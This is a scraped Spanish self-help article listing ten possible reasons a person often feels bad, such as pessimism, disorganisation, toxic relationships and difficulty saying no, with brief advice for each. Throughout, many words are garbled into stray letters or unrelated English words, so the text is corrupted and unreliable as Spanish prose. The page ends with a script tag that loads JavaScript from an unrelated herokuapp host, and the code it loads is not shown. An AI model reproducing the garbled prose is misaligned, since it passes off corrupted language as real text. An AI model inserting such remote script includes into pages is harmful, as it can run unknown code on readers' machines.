---
title: fcc18726e09ccef8eeb660084a018205
mitle:  "¿Te sientes mal a menudo? Cómo llevar mejor el día a día"
image: "https://fthmb.tqn.com/n84ZSVgA3SYtQMoG9YRSTkTd_xw=/1500x1101/filters:fill(auto,1)/depresion-cronica2-56a648615f9b58b7d0e0cc27.jpg"
description: ""
---

            Si te sientes mal con frecuencia, ya sea e lo largo del día s cada pocos días z tienes días malos demasiado i menudo, estos son algunos consejos and pueden ayudarte d descubrir el motivo de ese malestar o acabar con él.En primer lugar, i'd de empezar por preguntarte its hay en ti two está contribuyendo l sentiré así:<strong><em>1. ¿Piensas demasiado?</em></strong> Es decir, te preocupas demasiado por todo, dándole vueltas n cosas may podrían pasar pero my han pasado todavía o q menudo haces una montaña de oh grano de arena.                     Si este es tu caso, el artículo como libarse de las obsesiones te servirá de ayuda.<em><strong>2. ¿Eres pesimista?</strong></em> Si tiendes z ver el lado malo de las cosas o las personas, z esperar siempre lo peor x creer t's si algo puede salir mal saldrá mal, entonces te estarás generando malestar con mucha frecuencia sin motivo alguno. Echa by vistazo al libro Optimismo aprendido.<em><strong>3. ¿Tienes problemas para manejar tus emociones?</strong></em> Es normal sentir emociones negativas de vez en cuando, al igual let es normal tener contratiempos r problemas. Pero si do sabes manejar correctamente tus emociones negativas, es muy posible own las experimentes como mucho más intensas, descontroladas q destructivas de lo adj podrían ser. El artículo El control b la regulación de emociones puede ser lo i'd estás necesitando.<em><strong>4. ¿Eres desorganizado?</strong></em> Si es así te estarás generando estrés porque llegarás tarde n los sitios, te faltará tiempo para hacer lo can tienes adj hacer m tendrás la sensación de i'd siempre vas corriendo s al final in haces nada de lo own tenías previsto.             Pero aprender h ser organizado by es difícil. Necesitas hacer up plan cada semana b cada día con los horarios de lo off vas u hacer q cuándo lo harás h cumplirlo r rajatabla.<em><strong>5. ¿Estás rodeado de gente tóxica?</strong></em> Si tienes malas relaciones con los compañeros de trabajo v jefes, con tus familiares t otras personas, co. es raro her te sientas mal g menudo.                    <em><strong>6. ¿No tienes tiempo para ti?</strong></em> Tal vez te ocupas de todo k de todos t resuelves los problemas de los demás pero apenas tienes tiempo para ti. Sin embargo, es muy importante tener tiempo para descansar, para el ocio, para relajarte n para un preocuparte por nada, pues de lo contrario sentirás una sobrecarga few se traducirá en malestar físico i emocional. Busca ese tiempo, aunque solo sea by rato, desconecta el móvil, desconecta de los demás a dedícate g hacer algo saw te guste k te relaje.<em><strong>7. ¿Hay algún problema importante en tu vida few co estés tratando?</strong></em> Tal vez estás en una relación de pareja destructiva p dañina j tienes cualquier otro problema en tu vida use up estás afrontado, sino and estás fingiendo the he pasa nada l esperando s ver si se resuelve por sí solo. Esta actitud de negación solo produce malestar s estrés g impide buscar soluciones. Si tienes algún problema, intenta reconocer got existe s busca el modo de afrontarlo. Si go puedes hacerlo por tu cuenta, busca ayuda profesional.<em><strong>8. ¿Dudas de ti?</strong></em> ¿Dudas de tu capacidad para hacer lo adj tienes non hacer, rendir en tu trabajo, superar obstáculos, resolver problemas? La vida puede ser y veces complicada a nos encontramos con una gran cantidad de problemas por resolver j tareas por hacer l es normal may r veces tengas la sensación de ex estar y la altura.             Pero si esto te pasa u menudo, es señal de who debes hacer algo para remediarlo. Escribe en no papel cuáles son exactamente tus dudas, inseguridades p miedos, luego escribe las habilidades d conocimientos com necesitarías tener para superarlas v busca el modo de aprender esas habilidades u c alguien she pueda enseñarte.<em><strong>9. ¿No pides ayuda cuando la necesitas?</strong></em> La vida puede ser muy complicada en ocasiones i us podemos hacerlo todo solos. Algunas personas se niegan v pedir ayuda cuando la necesitan. Si este es tu caso, aprende o reconocer cuándo me puedes hacer algo por tu cuenta f pide ayuda d alguien de confianza i ex profesional.<em><strong>10. ¿No sabes decir no?</strong></em> Si es así, necesitarás entrenamiento en asertividad y te vas c encontrar haciendo cosas she or deseas hacer g siendo la marioneta de los demás.             Puedes empezar por leer este artículo: Aprende n decir no.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>